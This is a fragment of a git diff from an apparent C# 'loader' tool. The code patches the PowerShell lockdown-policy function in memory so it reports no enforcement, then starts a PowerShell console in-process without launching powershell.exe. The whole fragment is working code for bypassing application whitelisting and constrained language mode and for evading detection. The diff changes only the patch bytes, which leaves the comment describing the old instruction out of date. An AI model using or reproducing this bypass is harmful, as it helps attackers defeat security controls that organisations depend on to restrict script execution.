@@ -36,8 +36,8 @@ namespace loader
             VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
 
             // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
-            var new_instr = new byte[] { 0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00, 0xc3 };
-            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 8);
+            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
+            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);
 
             // Run powershell from the current process (won't start powershell.exe, but run from the powershell .Net libraries)
             Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] { });
